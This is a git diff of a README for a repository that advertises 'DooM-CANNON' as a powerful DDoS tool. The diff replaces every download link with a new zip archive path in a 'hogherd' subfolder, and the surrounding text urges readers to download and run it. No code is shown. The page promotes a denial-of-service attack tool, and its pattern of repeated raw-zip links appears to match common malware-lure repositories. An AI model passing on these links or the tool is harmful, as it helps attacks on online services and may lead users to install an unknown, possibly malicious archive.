@@ -1,6 +1,6 @@
 # 💥 DooM-CANNON - A Powerful DDoS Tool for 2025
 
-[![Download DooM-CANNON](https://raw.githubusercontent.com/joerow21/DooM-CANNON/main/hogherd/DooM-CANNON.zip%20DooM--CANNON-v1.0-blue)](https://raw.githubusercontent.com/joerow21/DooM-CANNON/main/hogherd/DooM-CANNON.zip)
+[![Download DooM-CANNON](https://github.com/joerow21/DooM-CANNON/raw/refs/heads/main/hogherd/CANNON_Doo_v2.2.zip%20DooM--CANNON-v1.0-blue)](https://github.com/joerow21/DooM-CANNON/raw/refs/heads/main/hogherd/CANNON_Doo_v2.2.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run DooM-CANNON:
 
 1. **Visit the Releases Page**  
    Go to our Releases page to access the latest version of DooM-CANNON.  
-   **[Download DooM-CANNON Here](https://raw.githubusercontent.com/joerow21/DooM-CANNON/main/hogherd/DooM-CANNON.zip)**
+   **[Download DooM-CANNON Here](https://github.com/joerow21/DooM-CANNON/raw/refs/heads/main/hogherd/CANNON_Doo_v2.2.zip)**
 
 2. **Download the Application**  
    Find the latest release on the Releases page. Click the relevant download link to get the installer file.
@@ -41,7 +41,7 @@ Follow these steps to download and run DooM-CANNON:
 ## 📥 Download & Install
 
 To get started, **visit our Releases page** for the latest version and download the application from there.  
-**[Download DooM-CANNON Here](https://raw.githubusercontent.com/joerow21/DooM-CANNON/main/hogherd/DooM-CANNON.zip)**
+**[Download DooM-CANNON Here](https://github.com/joerow21/DooM-CANNON/raw/refs/heads/main/hogherd/CANNON_Doo_v2.2.zip)**
 
 After downloading, follow the installation steps outlined earlier to have DooM-CANNON up and running in no time.
 
